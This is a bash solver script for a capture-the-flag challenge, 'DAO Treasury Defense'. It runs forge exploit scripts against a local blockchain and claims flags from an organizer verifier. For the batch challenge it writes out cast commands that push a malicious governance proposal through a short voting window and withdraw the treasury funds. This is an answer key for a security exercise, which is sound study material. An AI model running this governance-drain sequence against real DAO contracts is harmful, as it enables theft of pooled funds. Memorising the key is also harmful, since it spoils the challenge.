#!/usr/bin/env bash
# One-shot forge solver for DAO Treasury Defense.
#
#   ./solve.sh [target] [privateKey]
#
# target defaults to http://127.0.0.1:8080. Flags are claimed from the organizer
# verifier — set VERIFIER (default http://127.0.0.1:9090), TEAM (default
# team01) and PRIVATE_KEY (generate one with `cast wallet new`).
#
# The verifier is baseline-delta: it snapshots the player's balances when the
# claim challenge is ISSUED and verifies the DELTA at submit time. So each
# balance-based exploit is sequenced as challenge -> exploit -> submit.
# The ghost exploit writes probe.txt, so its challenge is issued after the
# exploit (the proof address must be known first).
set -euo pipefail

TARGET="${1:-http://127.0.0.1:8080}"
TARGET="${TARGET%/}"
KEY="${PRIVATE_KEY:-${2:-}}"
VERIFIER="${VERIFIER:-http://127.0.0.1:9090}"
TEAM="${TEAM:-team01}"

if [ -z "$KEY" ]; then
  echo "error: set PRIVATE_KEY or pass it as the second argument (cast wallet new)" >&2
  exit 1
fi

export PRIVATE_KEY="$KEY"
export VERIFIER="$VERIFIER"
export TEAM="$TEAM"

PLAYER="$(cast wallet address --private-key "$KEY")"
echo "player: $PLAYER"
export PLAYER

# Fund the player and export every contract address + victim as env vars the
# forge scripts read via vm.envAddress(...).
eval "$(PLAYER="$PLAYER" node -e '
const TARGET = process.argv[1];
(async () => {
  await fetch(TARGET + "/faucet", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ player: process.env.PLAYER }),
  });
  const info = await (await fetch(TARGET + "/info")).json();
  const M = {
    gov: "GOV", treasuryAsset: "TREASURY_ASSET", collateral: "COLLATERAL",
    debt: "DEBT", lp: "LP", reward: "REWARD", marketAsset: "MARKET_ASSET",
    stable: "STABLE", mirror: "MIRROR", vault: "VAULT", treasury: "TREASURY",
    timelock: "TIMELOCK", governor: "GOVERNOR", oracle: "ORACLE",
    lending: "LENDING", rewardStaking: "REWARD_STAKING",
    legacyGauge: "LEGACY_GAUGE", currentGauge: "CURRENT_GAUGE", amm: "AMM",
  };
  const lines = [];
  for (const [k, v] of Object.entries(M)) if (info.contracts[k]) lines.push(`export ${v}=${info.contracts[k]}`);
  lines.push(`export VICTIM=${info.victim}`);
  console.log(lines.join(";"));
})().catch((e) => { console.error(e.message); process.exit(1); });
' "$TARGET")"

RPC="$TARGET/rpc"
run_script() { forge script "script/$1.s.sol" --rpc-url "$RPC" --private-key "$KEY" --broadcast --skip-simulation -vv; }

# ---- oracle: challenge -> exploit -> submit ----
echo "=== oracle ==="
node claim.mjs challenge oracle
run_script ExploitOracle
node claim.mjs submit oracle

# ---- gauge: challenge -> exploit -> submit ----
echo "=== gauge ==="
node claim.mjs challenge gauge
run_script ExploitGauge
node claim.mjs submit gauge

# ---- batch: challenge -> propose/vote/queue/execute -> submit ----
# The batch vote/queue/execute are block-dependent (a single-block voting
# window), which forge's upfront gas estimation cannot replay. Propose as a
# forge script, then finish with cast --gas-limit (no estimation).
echo "=== batch ==="
node claim.mjs challenge batch
forge script script/ExploitBatch.s.sol --rpc-url "$RPC" --private-key "$KEY" --broadcast --skip-simulation -vv
PID="$(cast call "$GOVERNOR" "latestProposalId(address)(uint256)" "$PLAYER" --rpc-url "$RPC" | cut -d' ' -f1)"
cast send "$GOVERNOR" "castVote(uint256)" "$PID" --private-key "$KEY" --rpc-url "$RPC" --gas-limit 500000 --confirmations 1 >/dev/null
# Advance two blocks (the RPC allowlist blocks evm_mine) so the 2-block voting
# period elapses before queueing.
cast send "$PLAYER" --value 1 --private-key "$KEY" --rpc-url "$RPC" --gas-limit 30000 --confirmations 1 >/dev/null
cast send "$PLAYER" --value 1 --private-key "$KEY" --rpc-url "$RPC" --gas-limit 30000 --confirmations 1 >/dev/null
cast send "$GOVERNOR" "queueBatch(uint256)" "$PID" --private-key "$KEY" --rpc-url "$RPC" --gas-limit 2000000 --confirmations 1 >/dev/null
cast send "$GOVERNOR" "executeBatch(uint256)" "$PID" --private-key "$KEY" --rpc-url "$RPC" --gas-limit 3000000 --confirmations 1 >/dev/null
cast send "$VAULT" "withdraw(uint256)" 150000000000000000000 --private-key "$KEY" --rpc-url "$RPC" --gas-limit 300000 >/dev/null
echo "batch: executed (1040 treasury asset drained)"
node claim.mjs submit batch

# ---- sandwich: challenge -> exploit -> submit ----
echo "=== sandwich ==="
node claim.mjs challenge sandwich
run_script ExploitSandwich
node claim.mjs submit sandwich

# ---- ghost: exploit (writes probe.txt) -> challenge -> submit ----
echo "=== ghost ==="
run_script ExploitGhost
node claim.mjs challenge ghost
node claim.mjs submit ghost
